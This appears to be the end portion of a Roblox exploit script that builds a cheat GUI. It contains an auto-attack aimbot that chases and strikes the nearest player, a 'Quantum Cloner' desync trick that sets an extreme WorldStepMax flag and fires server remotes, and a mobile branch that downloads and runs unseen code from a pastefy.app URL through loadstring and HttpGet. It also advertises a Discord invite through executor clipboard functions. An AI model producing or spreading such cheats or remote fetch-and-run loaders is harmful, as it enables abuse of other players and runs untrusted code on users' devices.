-- StarterGui.ScreenGui.VexAutoPush.TextButton.LocalScript
local function C_13d()
local script = G2L["13d"];
	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	
	local player = Players.LocalPlayer
	local button = script.Parent
	
	local MAX_DISTANCE = 20
	local MIN_DISTANCE = 4
	local TOOL_NAME = "Bat"
	local ATTACK_COOLDOWN = 0.6
	
	local OFF_COLOR = Color3.fromRGB(255,255,255)
	local ON_COLOR = Color3.fromRGB(0, 255, 0)
	
	local isEnabled = false
	local connection
	local lastAttack = 0
	
	local function hasBatEquipped()
		local char = player.Character
		if not char then return false end
	
		for _,tool in pairs(char:GetChildren()) do
			if tool:IsA("Tool") and tool.Name == TOOL_NAME then
				return true
			end
		end
		return false
	end
	
	local function getClosestEnemy()
		local char = player.Character
		if not char then return nil end
		local hrp = char:FindFirstChild("HumanoidRootPart")
		if not hrp then return nil end
	
		local closest, dist = nil, MAX_DISTANCE
	
		for _,plr in pairs(Players:GetPlayers()) do
			if plr ~= player and plr.Character then
				local ehrp = plr.Character:FindFirstChild("HumanoidRootPart")
				local hum = plr.Character:FindFirstChild("Humanoid")
				if ehrp and hum and hum.Health > 0 then
					local d = (ehrp.Position - hrp.Position).Magnitude
					if d <= dist then
						dist = d
						closest = plr
					end
				end
			end
		end
	
		return closest
	end
	
	local function attack(tool)
		if not tool then return end
		if tick() - lastAttack < ATTACK_COOLDOWN then return end
		lastAttack = tick()
		pcall(function()
			tool:Activate()
		end)
	end
	
	local function activate()
		connection = RunService.Heartbeat:Connect(function()
			if not hasBatEquipped() then return end
	
			local char = player.Character
			if not char then return end
	
			local hrp = char:FindFirstChild("HumanoidRootPart")
			local hum = char:FindFirstChild("Humanoid")
			if not hrp or not hum then return end
	
			local target = getClosestEnemy()
			if not target or not target.Character then return end
	
			local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
			if not targetHRP then return end
	
			local distance = (targetHRP.Position - hrp.Position).Magnitude
	
			if distance > MIN_DISTANCE then
				local direction = (targetHRP.Position - hrp.Position).Unit
				local safePosition = targetHRP.Position - direction * MIN_DISTANCE
				hum:MoveTo(safePosition)
			else
				hum:MoveTo(hrp.Position)
			end
	
			local tool = char:FindFirstChild(TOOL_NAME)
			if tool then
				attack(tool)
			end
		end)
	end
	
	local function deactivate()
		if connection then
			connection:Disconnect()
			connection = nil
		end
	end
	
	local function toggle()
		if isEnabled then
			deactivate()
			button.TextColor3 = OFF_COLOR
		else
			activate()
			button.TextColor3 = ON_COLOR
		end
		isEnabled = not isEnabled
	end
	
	button.MouseButton1Click:Connect(toggle)
	
end;
task.spawn(C_13d);

-- StarterGui.ScreenGui.VexCloner.LocalScript
local function C_147()
local script = G2L["147"];
	--=============================--
	--    FRAME ARRASRTABLE + BOTONES
	--=============================--
	
	local guiFrame = script.Parent
	local UserInputService = game:GetService("UserInputService")
	
	guiFrame.Active = true -- Muy importante para recibir Input
	
	local dragging = false
	local dragInput, dragStart, startPos
	
	-- Funcin para actualizar la posicin
	local function update(input)
		local delta = input.Position - dragStart
		guiFrame.Position = UDim2.new(
			startPos.X.Scale,
			startPos.X.Offset + delta.X,
			startPos.Y.Scale,
			startPos.Y.Offset + delta.Y
		)
	end
	
	-- Detectar inicio de arrastre
	local function inputBegan(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = guiFrame.Position
	
			-- Detectar cuando suelta el mouse
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end
	
	-- Detectar movimiento del mouse
	local function inputChanged(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then
			dragInput = input
		end
	end
	
	-- Conectar InputChanged global para actualizar mientras arrastra
	UserInputService.InputChanged:Connect(function(input)
		if dragging and input == dragInput then
			update(input)
		end
	end)
	
	-- Conectar eventos de Frame
	guiFrame.InputBegan:Connect(inputBegan)
	guiFrame.InputChanged:Connect(inputChanged)
	
	-- Conectar tambin todos los botones dentro del Frame
	for _, obj in pairs(guiFrame:GetDescendants()) do
		if obj:IsA("GuiButton") then
			obj.InputBegan:Connect(inputBegan)
			obj.InputChanged:Connect(inputChanged)
		end
	end
	
end;
task.spawn(C_147);
-- StarterGui.ScreenGui.VexCloner.TextButton.LocalScript

-- StarterGui.ScreenGui.VexCloner.TextButton.LocalScript
local function C_149()
local script = G2L["149"];
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    local TOOL_NAME = "Quantum Cloner"
    local button = script.Parent
    
    local isEnabled = false
    local OFF_COLOR = Color3.fromRGB(255,255,255)
    local ON_COLOR = Color3.fromRGB(0, 255, 0)
    
    -- Function to activate the Quantum Cloner
    local function activateCloner()
        local success, error = pcall(function()
            local backpack = LocalPlayer:WaitForChild("Backpack")
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")
    
            local packages = ReplicatedStorage:WaitForChild("Packages", 5)
            if not packages then warn("Packages folder not found") return false end
    
            local netFolder = packages:WaitForChild("Net", 5)
            if not netFolder then warn("Net folder not found") return false end
    
            local useItemRemote = netFolder:WaitForChild("RE/UseItem", 5)
            local teleportRemote = netFolder:WaitForChild("RE/QuantumCloner/OnTeleport", 5)
            if not useItemRemote or not teleportRemote then warn("Required remotes not found") return false end
    
            -- Find the tool
            local tool
            for _, item in ipairs(backpack:GetChildren()) do
                if item:IsA("Tool") and (item.Name:lower():find("cloner") or item.Name:lower():find("quantum")) then
                    tool = item
                    break
                end
            end
            
            -- Also check character
            if not tool then
                for _, item in ipairs(character:GetChildren()) do
                    if item:IsA("Tool") then
                        tool = item
                        break
                    end
                end
            end
    
            if tool then
                if tool.Parent == backpack then
                    humanoid:EquipTool(tool)
                end
                
                -- Activate desync
                if setfflag then 
                    setfflag("WorldStepMax", "-9999999999") 
                end
                
                useItemRemote:FireServer()
                teleportRemote:FireServer()
                
                if setfflag then 
                    setfflag("WorldStepMax", "-1") 
                end
                return true
            else
                warn("Quantum Cloner tool not found in inventory")
                return false
            end
        end)
    
        if not success then
            warn("Cloner activation failed: " .. tostring(error))
            return false
        end
        return success
    end
    
    -- Toggle function
    local function toggleCloner()
        if isEnabled then
            -- Turn OFF
            button.TextColor3 = OFF_COLOR
            isEnabled = false
        else
            -- Turn ON and activate
            button.TextColor3 = ON_COLOR
            isEnabled = true
            
            -- Actually run the cloner functionality
            local activated = activateCloner()
            
            if not activated then
                -- If failed, reset toggle
                button.TextColor3 = OFF_COLOR
                isEnabled = false
            end
        end
    end
    
    -- Connect the button
    button.MouseButton1Click:Connect(toggleCloner)
    
end;
task.spawn(C_149);

-- StarterGui.ScreenGui.mobile
local function C_14c()
local script = G2L["14c"];
	local UserInputService = game:GetService("UserInputService")
	
	-- Detectar si es dispositivo mvil
	local isMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
	
	if isMobile then
		loadstring(game:HttpGet("https://pastefy.app/yHlLpkWI/raw"))()
	end
	
end;
task.spawn(C_14c);

-- Add this function at the end of your script, before the return statement
local function C_discord_copy()
    local script = G2L["discord_copy_script"]
    local button = script.Parent
    local enlace = "https://discord.gg/FvMePtyJrq"  -- CHANGE THIS TO YOUR DISCORD LINK
    
    button.MouseButton1Click:Connect(function()
        -- Copy to clipboard for exploits
        if setclipboard then
            setclipboard(enlace)
        elseif toclipboard then
            toclipboard(enlace)
        elseif writeclipboard then
            writeclipboard(enlace)
        end
    
        -- Animation of "copied"
        local original = button.Text
        button.Text = "COPIED!"
        task.wait(1.2)
        button.Text = original
    end)
    
    -- Add hover animations like the top button
    local TweenService = game:GetService("TweenService")
    local TweenSpeed = 0.1
    local Info = TweenInfo.new(TweenSpeed, Enum.EasingStyle.Quad, Enum.EasingDirection.In, 0)
    
    button.MouseEnter:Connect(function()
        local Color = Color3.fromRGB(108, 121, 262)  -- Lighter Discord blue on hover
        TweenService:Create(button.Parent, Info, {BackgroundColor3 = Color}):Play()
        TweenService:Create(button, Info, {TextColor3 = Color3.fromRGB(0, 0, 0)}):Play()
    end)
    
    button.MouseLeave:Connect(function()
        local Color = Color3.fromRGB(88, 101, 242)  -- Back to original Discord blue
        TweenService:Create(button.Parent, Info, {BackgroundColor3 = Color}):Play()
        TweenService:Create(button, Info, {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
    end)
end

-- Spawn the function
task.spawn(C_discord_copy)

-- StarterGui.ScreenGui.ToggleGuiButton.LocalScript
local function C_toggle_button()
    local script = G2L["141"]
    local ImageButton = script.Parent
    local TweenService = game:GetService("TweenService")
    local UserInputService = game:GetService("UserInputService")
    
    -- Get reference to the main GUI frame
    local mainFrame = ImageButton.Parent:FindFirstChild("Frame")
    
    -- If mainFrame doesn't exist, try to find it
    if not mainFrame then
        -- Try different possible names
        for _, child in pairs(ImageButton.Parent:GetChildren()) do
            if child:IsA("Frame") and child.Name == "Frame" then
                mainFrame = child
                break
            end
        end
    end
    
    local WindowOpen = false
    
    -- Function to toggle GUI
    local function toggleGUI()
        local shrink = TweenService:Create(ImageButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 50, 0, 50)
        })
        local grow = TweenService:Create(ImageButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 65, 0, 65)
        })

        shrink:Play()
        shrink.Completed:Wait()
        grow:Play()

        -- Toggle the main GUI visibility
        if mainFrame then
            if WindowOpen then
                mainFrame.Visible = false
            else
                mainFrame.Visible = true
            end
            WindowOpen = not WindowOpen
        end
    end
    
    -- Click animation and toggle
    ImageButton.MouseButton1Click:Connect(toggleGUI)
    
    -- Dragging functionality
    local isDragging = false
    local dragInput, dragStart, startPosition
    
    local function updatePosition(input)
        local delta = input.Position - dragStart
        ImageButton.Position = UDim2.new(
            startPosition.X.Scale, startPosition.X.Offset + delta.X,
            startPosition.Y.Scale, startPosition.Y.Offset + delta.Y
        )
    end
    
    ImageButton.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 
        or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            dragStart = input.Position
            startPosition = ImageButton.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    isDragging = false
                end
            end)
        end
    end)
    
    ImageButton.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement 
        or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and isDragging then
            updatePosition(input)
        end
    end)
    
    -- AUTO-OPEN GUI ON FIRST LOAD
    -- Wait a moment for everything to load, then open GUI
    task.wait(0.5)
    
    if mainFrame then
        mainFrame.Visible = true
        WindowOpen = true
        
        -- Optional: Animate the toggle button to show it's active
        task.spawn(function()
            local pulse = TweenService:Create(ImageButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true, 0), {
                Size = UDim2.new(0, 70, 0, 70)
            })
            pulse:Play()
        end)
    end
end

-- Spawn the function
task.spawn(C_toggle_button)

return G2L["1"], require;
end
